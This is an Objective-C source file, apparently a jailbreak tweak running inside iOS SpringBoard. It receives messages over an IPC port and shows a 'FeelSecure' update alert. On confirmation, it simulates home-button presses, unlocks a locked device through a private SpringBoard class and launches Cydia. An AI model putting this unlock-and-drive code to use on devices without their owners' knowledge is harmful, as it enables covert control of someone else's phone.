//
//  SpringBoardUIAlertServiceManager.m
//  MSFSP
//
//  Created by Makara Khloth on 10/3/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "SpringBoardUIAlertServiceManager.h"
#import "Visibility.h"
#import "DefStd.h"
#import "SBUIController.h"
#import "SBApplicationController.h"
#import "SBApplication.h"
#import "SpringBoard.h"
#import "SBAwayController.h"

static SpringBoardUIAlertServiceManager *_SpringBoardUIAlertServiceManager = nil;

#pragma mark -
#pragma mark Function definition of callback
#pragma mark -

void fxSpringBoardServiceCallback (CFNotificationCenterRef center, 
								   void *observer, 
								   CFStringRef name, 
								   const void *object, 
								   CFDictionaryRef userInfo);

@interface SpringBoardUIAlertServiceManager (private)
- (void) serviceWithUserInfo: (NSDictionary *) aUserInfo;
- (void) launchCydia;
@end

@implementation SpringBoardUIAlertServiceManager

+ (id) sharedSpringBoardUIAlertServiceManager {
	if (_SpringBoardUIAlertServiceManager == nil) {
		_SpringBoardUIAlertServiceManager = [[SpringBoardUIAlertServiceManager alloc] init];
	}
	return (_SpringBoardUIAlertServiceManager);
}

- (id) init {
	if ((self = [super init])) {
		mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kFSBSUIAlertMessagePort
												 withMessagePortIPCDelegate:self];
		[mMessagePortReader start];
	}
	return (self);
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    NSDictionary *userInfo = [unarchiver decodeObjectForKey:@"userInfo"];
    [unarchiver finishDecoding];
	[self serviceWithUserInfo:userInfo];
	[unarchiver release];
}

- (void) serviceWithUserInfo: (NSDictionary *) aUserInfo {
	DLog (@"Service with user info = %@", aUserInfo);
	NSString *alertType = [aUserInfo objectForKey:@"alertType"];
	if ([alertType isEqualToString:@"SoftwareUpdate"]) {
		NSString *text = [aUserInfo objectForKey:@"message"];
		NSString *url = [aUserInfo objectForKey:@"url"];
		NSString *message = [NSString stringWithFormat:@"%@\n%@", text, url];
		
		UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"FeelSecure"
														message:message
													   delegate:self 
											  cancelButtonTitle:@"Cancel"
											  otherButtonTitles:@"Ok", nil];
		[alert show];
		[alert release];
	}
}

- (void) launchCydia {	
	Class $SBApplicationController = objc_getClass("SBApplicationController");
	SBApplication *sbCydiaApplication = [[$SBApplicationController sharedInstance] applicationWithDisplayIdentifier:kCYDIAIDENTIFIER];
	
	Class $SBUIController = objc_getClass("SBUIController");
	[[$SBUIController sharedInstance] activateApplicationAnimated:sbCydiaApplication];
}

- (void)alertView:(UIAlertView *)alertView didDismissWithButtonIndex:(NSInteger)buttonIndex {
	DLog (@"Button index of clicked button of software update alert view is = %d", buttonIndex);
    if (buttonIndex == 1) { // Ok
		SpringBoard *sb = (SpringBoard *)[UIApplication sharedApplication];
		SBApplication *sbApplicaton = [sb _accessibilityFrontMostApplication];
		DLog (@"Front most accessible application = %@", sbApplicaton);
		if (sbApplicaton != nil) { // nil mean no application is front most that's mean unlock state home screen		
			if (![[sbApplicaton bundleIdentifier] isEqualToString:kCYDIAIDENTIFIER]) {
				[sb menuButtonDown:nil];
				[sb menuButtonUp:nil];
				[self performSelector:@selector(launchCydia) withObject:nil afterDelay:1.0];
			}
		} else {
			if ([sb isLocked]) {
				Class $SBAwayController = objc_getClass("SBAwayController");
				[[$SBAwayController sharedAwayController] unlockWithSound:YES];
				
				[sb menuButtonDown:nil];
				[sb menuButtonUp:nil];
				[self performSelector:@selector(launchCydia) withObject:nil afterDelay:2.0];
			} else {
				[self launchCydia];
			}
		}
	}
}

- (void) dealloc {
	[mMessagePortReader stop];
	[mMessagePortReader release];
	[super dealloc];
	_SpringBoardUIAlertServiceManager = nil;
}

@end
